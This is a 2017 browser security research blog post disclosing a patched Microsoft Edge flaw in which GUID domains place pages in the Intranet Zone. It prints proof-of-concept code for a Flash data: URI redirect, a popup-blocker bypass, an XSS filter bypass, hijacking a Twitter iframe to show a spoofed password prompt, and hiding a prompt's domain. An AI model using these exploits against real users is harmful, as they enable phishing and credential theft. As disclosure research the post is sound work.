<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="alternate icon" type="image/x-icon" href="/favicon.ico"><meta name="generator" content="Astro v5.16.6"><title>Defeating the popUp blocker, the XSS filter and SuperNavigate with our fake ticket to the Intranet Zone (Edge)</title><meta name="description" content><link rel="canonical" href="https://www.brokenbrowser.com/blog/free-ticket-to-the-intranet-zone/"><meta property="og:title" content="Defeating the popUp blocker, the XSS filter and SuperNavigate with our fake ticket to the Intranet Zone (Edge)"><meta property="og:description" content><meta property="og:type" content="website"><meta property="og:url" content="https://www.brokenbrowser.com/blog/free-ticket-to-the-intranet-zone/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Defeating the popUp blocker, the XSS filter and SuperNavigate with our fake ticket to the Intranet Zone (Edge)"><meta name="twitter:description" content><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="RSS" href="/rss.xml"><link rel="stylesheet" href="/_astro/_slug_.D8CnJWvD.css"></head> <body> <div class="container center"> <header class="header"> <div class="header__inner"> <div class="header__logo"> <a href="/"> <div class="logo">
MagicMac Labs
</div> </a> </div> <ul class="menu menu--mobile"> <li class="menu__trigger">Menu ▾</li> <li> <ul class="menu__dropdown"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </li> </ul> </div> <nav class="navigation-menu"> <ul class="navigation-menu__inner menu--desktop"> <!--<li><a href={`${base}`}>Home</a></li>--> <li><a href="/browser-workshop/">Browser Workshop</a></li> <li><a href="/musings/">Musings</a></li> <li><a href="/about/">About</a></li> </ul> </nav> </header> <main class="content">  <article> <h1 class="post-title">Defeating the popUp blocker, the XSS filter and SuperNavigate with our fake ticket to the Intranet Zone (Edge)</h1> <div class="post-meta"> <time> <time datetime="2017-03-31T00:00:00.000Z"> 2017-03-31 </time> </time> <span class="post-category"> :: browser-workshop</span>  </div>  <div class="post-content">  <p>Last year we explored the <a href="../uxss-edge-domainless-world/">domainless blank technique</a> to create UXSS/SOP bypasses on both <a href="../uxss-edge-domainless-world/">Microsoft Edge</a> and <a href="../uxss-ie-domainless-world/">Internet Explorer</a>. The Edge version has been recently patched but unfortunately the fix introduces a new security issue which allows attackers to exploit other things. In other words, <strong>the patch kills a bug but creates another one</strong>.</p>
<p>In a hurry? Watch the <a href="https://www.youtube.com/watch?v=wWrb8xftWuc&#x26;list=PL12o0t84rBX_oDmz93NwGNgTDiWf-HfUY">35 sec video where we quickly show</a> what can be done with this vulnerability.</p>
<p>The original problem was that domainless pages (about:blank URLs with empty document.domains) were essentially <strong>capable of accessing the DOM of any document-origin</strong>, but Microsoft patched this by adding a random domain (<a href="https://en.wikipedia.org/wiki/Universally_unique_identifier">GUID</a>) to them. In other words, the <strong>domainless blanks are not domainless anymore</strong>. They are always rendered with random UUID domains like {53394a4f-8c04-46ab-94af-3ab86ffcfd4c}.</p>
<p><img src="/images/2017/03/01-guid-domain.png" alt=""></p>
<p>While testing the patch I immediately stumbled upon this GUID-domain, so I changed my focus. The original goal was to analyze the patch and try to bypass it, but when that nice URL appeared in front of my face it reminded me IE zones which are <em>to some extent</em> inherited by Edge.</p>
<h2 id="intranet-vs-internet">Intranet vs Internet</h2>
<p>As you probably know, webpages running in the Intranet Zone have less restrictions than the ones in Internet. Edge has different mechanisms to distinguish when a page is being loaded from the Intranet vs Internet and the most notable is the <a href="https://technet.microsoft.com/en-us/library/security/ms98-016.aspx">dotless URL.</a></p>
<blockquote>
<p>When a webpage is rendered from a domain without dots like <code>http://localhost</code>, Edge renders it with less restrictions than the same page in <code>http://example.com</code> because the former is considered to be in Intranet Zone.</p>
</blockquote>
<p>No dots in the URL? It’s Intranet. Of course, there are exceptions like about:blank which is also considered Internet Zone even without having dots in the URL.</p>
<p>Anyway, if we manage to fool Edge into thinking that our webpage is part of an Intranet, then we will be free to do stuff that wouldn’t be normally possible. Example? Disable the pop-up blocker, the XSS-filter, and even enable SuperNavigate: the capability of setting the location of iframes and windows that are not in our domain. We will see how powerful is this a bit later, but first, let’s see on IE what things are possible when we are in the Intranet Zone. I know we are speaking of Edge, but IE has this simple dialog in plain English which comes handy just to see which security features are disabled in Intranet Zone.</p>
<p><img src="/images/2017/03/02-intranet-settings.png" alt=""></p>
<h2 id="welcome-to-the-intranet-zone">Welcome to the Intranet Zone</h2>
<p>The screenshot above shows at least three interesting features the attacker can use if she has a ticket to the Intranet Zone. And it turns out <strong>the dotless GUID makes Edge think that we are in the Intranet Zone</strong> allowing us to bypass all those restrictions. So bug hunter, this will be super easy once we ride into the Intranet. Let’s do it!</p>
<blockquote>
<ol>
<li>Load a data:uri in the top. Our location is now data: but the domain is the same as the one who loaded this data:uri (still Internet Zone)</li>
<li>document.write the data:uri against itself. This leaves us with a data:uri as the URL but its domain is now a random GUID. We are in Intranet zone!</li>
</ol>
</blockquote>
<p>Edge will try to prevent us from loading a data: URI on top, but Flash is our friend here and it lets us load data:URIs on top. We will use the simple getURL from Flash. Take a look at the code below. We are rendering a Flash inside an iframe, and the Flash itself changes the URL of the top window by a data:URI.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">window[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">].</span><span style="color:var(--astro-code-token-constant)">location</span><span style="color:var(--astro-code-token-function)">.replace</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">'geturl.swf?TARGET=_top&#x26;REDIR=data:,'</span><span style="color:var(--astro-code-token-keyword)">+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">'&#x3C;script>window.onload=function(){'</span><span style="color:var(--astro-code-token-keyword)">+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">'           document.write("We are in a GUID URL (Intranet Zone) now");'</span><span style="color:var(--astro-code-token-keyword)">+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">'           document.close();'</span><span style="color:var(--astro-code-token-keyword)">+</span></span>
<span class="line"><span style="color:var(--astro-code-token-string-expression)">'}&#x3C;\/script>'</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p>Also, it is important to render the Flash inside an iframe, otherwise Edge will complain. But anyway, once the above happens we are in Intranet Zone. Let’s have fun now!</p>
<h2 id="abusing-of-the-intranet-zone">Abusing of the Intranet Zone</h2>
<p>The following three PoCs will always use first the code described above to get into the Intranet Zone and then run the payloads below. Also, the payloads will be loaded from an external script so we can work more comfortably. I don’t like encoding tons of bytes in the data:URI. It confuses me!</p>
<p>Let’s go with the PopUp blocker bypass. Be aware that once you click on the link below, it will open 5 popups without your interaction. The code works as if the pop-up blocker did not exist.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-foreground)"> (</span><span style="color:var(--astro-code-token-keyword)">var</span><span style="color:var(--astro-code-foreground)"> i</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">; i</span><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-token-constant)">5</span><span style="color:var(--astro-code-foreground)">; i</span><span style="color:var(--astro-code-token-keyword)">++</span><span style="color:var(--astro-code-foreground)">)</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">{</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">   window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"http://www.bing.com"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)">"width=200,height=600"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">}</span></span></code></pre>
<p><img src="/images/2017/03/03-popupblocker-bypassed.png" alt=""></p>
<p><strong>[ Patched on 2017-05-09 ]</strong></p>
<p>That was nice, now we can open pop-ups without restrictions or user interaction. What about the XSS filter? Let’s XSS my other site, caballero.com.ar.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">window.open("https://www.caballero.com.ar/echo.php?xss=&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span><span style="color:var(--astro-code-token-function)">alert</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-constant)">document</span><span style="color:var(--astro-code-foreground)">.domain)</span><span style="color:var(--astro-code-token-keyword)">&#x3C;</span><span style="color:var(--astro-code-foreground)">\</span><span style="color:var(--astro-code-token-keyword)">/</span><span style="color:var(--astro-code-foreground)">script</span><span style="color:var(--astro-code-token-keyword)">></span><span style="color:var(--astro-code-token-string-expression)">","</span><span style="color:var(--astro-code-foreground)">_self</span><span style="color:var(--astro-code-token-string-expression)">");</span></span></code></pre>
<p><strong>[ Patched on 2017-05-09 ]</strong></p>
<p>Great! Remember that these PoCs will work <strong>only</strong> if we are running in the Intranet Zone. In reality it’s not correct to call them “bypasses” because this is the default behavior in Intranet. We just set our zone to another one less restrictive and now we can freely play, that’s all. But let’s go with one more, the SuperNavigate one. Have you heard of it before? It allows the attacker to change the URL of any window/iframe regardless of its domain.</p>
<p>Maybe that’s a bit confusing, let’s try with an example: it allows the attacker to change the URL of a twitter-iframe that is running on a different tab, and that tab could be there before us. In other words, we don’t even need to open Twitter tab. If the user has Twitter opened anywhere, we can actually interact with it. Wow! Let’s change the URL of an iframe named “twitter-iframe” which is rendered by Twitter. Want to see it live?</p>
<p><img src="/images/2017/03/04-twitter-supernavigate.png" alt=""></p>
<p>OK, but let’s take a look at the code first.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:var(--astro-code-foreground)">win  </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"https://www.twitter.com"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">function</span><span style="color:var(--astro-code-token-function)"> wait_for_tweet_post_iframe</span><span style="color:var(--astro-code-foreground)">()</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">{</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">	// Wait until the twitter iframe exists</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">	if</span><span style="color:var(--astro-code-foreground)"> (win[</span><span style="color:var(--astro-code-token-string-expression)">"tweet-post-iframe"</span><span style="color:var(--astro-code-foreground)">])</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	{	</span><span style="color:var(--astro-code-token-comment)">//Change the location of the twitter-iframe. This fires the prompt</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">		window</span><span style="color:var(--astro-code-token-function)">.open</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"twitter_pass.html"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "tweet-post-iframe"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">		clearInterval</span><span style="color:var(--astro-code-foreground)">(interval);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">	}</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">}</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">// Keep running until the twitter-iframe becomes available</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">interval </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> setInterval</span><span style="color:var(--astro-code-foreground)">(wait_for_tweet_post_iframe</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> 500</span><span style="color:var(--astro-code-foreground)">);</span></span></code></pre>
<p><strong>[ Patched on 2017-05-09 ]</strong></p>
<p>That was fun! One last thing before you go, bug hunter. Maybe you noted that Twitter’s prompt seemed to really be coming from a twitter domain. Normally a window.prompt shows the domain of the URL that fired it, but we can get rid of that. Read below if you are interested, it’s pretty easy.</p>
<h2 id="remove-domain-from-windowprompt">Remove domain from window.prompt</h2>
<p><img src="/images/2017/03/05-cracking-prompt.png" alt=""></p>
<p>As shown above, a regular prompt will show its domain-origin, however, there’s a very simple trick that removes that information: execute the prompt from an about:blank iframe. That’s enough to “clean” the domain from the prompt.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="html"><code><span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-foreground)">>&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">iframe</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">window[</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-foreground)">]</span><span style="color:var(--astro-code-token-function)">.prompt</span><span style="color:var(--astro-code-foreground)">(</span><span style="color:var(--astro-code-token-string-expression)">"No domain shown"</span><span style="color:var(--astro-code-foreground)">);</span></span>
<span class="line"><span style="color:var(--astro-code-foreground)">&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-foreground)">></span></span></code></pre>
<p><img src="/images/2017/03/06-nodomain-prompt.png" alt=""></p>
<p>I know it’s no big deal, but this little thing makes our prompt look like the real Twitter one. Just a detail.</p>
<p>If you want to analyze everything and play offline, <a href="https://goo.gl/ryYMIm">grab all the PoCs together</a>.</p>
<p>Have a nice day! :)</p>
<p><a href="https://twitter.com/magicmac2000">Manuel</a></p> <div class="pagination"> <div class="pagination__title"> <span class="pagination__title-h">Read other posts</span> <hr> </div> <div class="pagination__buttons">  <a href="/blog/referer-spoofing-patch-bypass/" class="button inline prev">
&lt; [Referrer spoofing with iframe injection (Edge)]
</a> <span>::</span> <a href="/blog/microsoft-edge-detecting-installed-extensions/" class="button inline next">
[Detecting Installed Extensions (Edge)] &gt;
</a> </div> </div>  </div> </article> <script type="module">document.addEventListener("DOMContentLoaded",()=>{document.querySelectorAll("pre.astro-code").forEach(t=>{const n=document.createElement("div");n.className="highlight",t.parentNode?.insertBefore(n,t),n.appendChild(t);const a=t.getAttribute("data-language")||"text",o=document.createElement("div");if(o.className="code-title",o.textContent=a,navigator.clipboard){const e=document.createElement("button");e.className="copy-button",e.textContent="Copy",e.addEventListener("click",async()=>{const c=t.textContent||"";try{await navigator.clipboard.writeText(c),e.textContent="Copied",setTimeout(()=>{e.textContent="Copy"},1e3)}catch(r){console.error("Failed to copy:",r)}}),o.appendChild(e)}n.insertBefore(o,t)})});</script>  <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>  </main> <footer class="footer"> <div class="footer__inner"> <div class="copyright"> <span>© 2026 MagicMac Labs</span> </div> </div> </footer> </div> <script type="module">(()=>{const s=document.querySelector(".container"),o=document.querySelectorAll(".menu");document.body.addEventListener("click",()=>{o.forEach(e=>{e.classList.contains("open")&&e.classList.remove("open")})}),window.addEventListener("resize",()=>{o.forEach(e=>{e.classList.remove("open")})}),o.forEach(e=>{const i=e.querySelector(".menu__trigger"),t=e.querySelector(".menu__dropdown");i&&t&&(i.addEventListener("click",n=>{n.stopPropagation(),e.classList.contains("open")?e.classList.remove("open"):(o.forEach(c=>c.classList.remove("open")),e.classList.add("open")),s&&t.getBoundingClientRect().right>s.getBoundingClientRect().right&&(t.style.left="auto",t.style.right="0")}),t.addEventListener("click",n=>n.stopPropagation()))})})();</script> </body> </html> 